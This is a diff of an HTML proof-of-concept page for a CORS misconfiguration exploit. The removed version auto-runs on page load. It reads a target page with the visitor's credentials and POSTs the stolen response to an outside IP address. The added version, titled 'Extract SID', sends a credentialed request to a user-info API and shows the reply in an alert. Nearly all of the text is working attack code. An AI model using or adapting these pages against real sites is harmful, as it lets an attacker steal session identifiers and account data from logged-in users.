@@ -1,35 +1,25 @@
-<!DOCTYPE>
 <html>
-<h1>cors exploit</h1>
-<script type="text/javascript">
-function exploit()
-{
-    var xhr1;
-    var xhr2;
-    if(window.XMLHttpRequest)
-    {
-        xhr1 = new XMLHttpRequest();
-        xhr2 = new XMLHttpRequest();
-    }
-    else
-    {
-        xhr1 = new ActiveXObject("Microsoft.XMLHTTP");
-        xhr2= new ActiveXObject("Microsoft.XMLHTTP");
-    }
-    xhr1.onreadystatechange=function()
-    {
-        if(xhr1.readyState == 4 && xhr1.status == 200) 
-        {
-            var datas=xhr1.responseText;
-            xhr2.open("POST","http://139.224.42.111/api/user/passport/auth/getUserInfo","true");
-            xhr2.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-            xhr2.send("z0="+escape(datas));      
-        }
-    }
-    xhr1.open("GET","http:/192.168.1.1/index.php","true") 
-    xhr1.withCredentials = true;        
-    xhr1.send();
+<body>
+<center>
+<h2>CORS POC Exploit</h2>
+<h3>Extract SID</h3>
+ 
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+ 
+<script>
+function cors() {
+　　var xhttp = new XMLHttpRequest();
+　　xhttp.onreadystatechange = function() {
+　　　　if (this.readyState == 4 && this.status == 200) {
+　　　　document.getElementById("demo").innerHTML = alert(this.responseText);
+　　　　}
+　　};
+　　xhttp.open("GET", "http://139.224.42.111/api/user/passport/auth/getUserInfo", true);
+　　xhttp.withCredentials = true;
+　　xhttp.send();
 }
-exploit();
 </script>
+</body>
 </html>
